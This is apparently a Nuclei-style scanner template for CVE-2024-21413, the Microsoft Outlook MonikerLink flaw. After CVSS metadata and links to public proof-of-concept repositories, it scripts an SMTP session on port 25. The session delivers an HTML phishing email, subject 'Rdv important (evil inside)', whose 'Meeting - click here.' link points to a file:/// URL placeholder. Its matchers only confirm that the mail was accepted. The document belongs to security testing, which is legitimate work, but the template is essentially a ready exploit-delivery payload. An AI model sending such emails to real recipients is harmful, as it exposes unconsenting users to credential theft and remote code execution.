id: CVE-2024-21413

info:
  name: Microsoft Outlook Remote Code Execution Vulnerability - CVE-2024-21413
  author: redperfect1847
  severity: critical
  description: |
    Microsoft Outlook Remote Code Execution Vulnerability. Successful exploitation of this vulnerability would allow an attacker to bypass the Office Protected View and open in editing mode rather than protected mode.
  reference:
    - https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/
    - https://www.vicarius.io/vsociety/posts/cve-2024-21413-critical-monikerlink-vulnerability-affecting-microsoft-outlook-mitigation-script
    - https://github.com/DerZiad/CVE-2024-21413
    - https://github.com/akyuksel/tryhackme-all-rooms-database
    - https://github.com/r00tb1t/CVE-2024-21413-POC
    - https://github.com/duy-31/CVE-2024-21413
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-21413
    cwe-id: CWE-20,NVD-CWE-noinfo
    epss-score: 0.93681
    epss-percentile: 0.99836
    cpe: cpe:2.3:a:microsoft:365_apps:-:*:*:*:enterprise:*:*:*
  metadata:
    vendor: microsoft
    product: 365_apps
  tags: smtp,injection,vulnerability,kev
tcp:
  - inputs:
      - data: "HELO {{Hostname}}\r\n"

      - data: "MAIL FROM:<{{from}}>\r\n"

      - data: "RCPT TO:<{{rcpt}}>\r\n"

      - data: "DATA\r\n"

      - data: |
          From: <{{from}}>
          To: <{{rcpt}}>
          Subject: Rdv important (evil inside)
          Mime-Version: 1.0
          Content-Type: multipart/alternative; boundary=test

          --test
          Content-Type: text/plain; charset=us-ascii

          This should be read in HTML
          --test
          Content-Type: text/html; charset=ISO-8859-1

          <html>
          <body>
          <h1><a href="file:///{{url}}">Meeting - click here.</a></h1>
          </body>
          </html>
          --test--\r\n.

      - data: "QUIT\r\n"

    host:
      - "{{Hostname}}"
    port: 25

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "220"
          - "250"
        part: all

      - type: regex
        regex:
          - "Meeting - click here."
        part: all
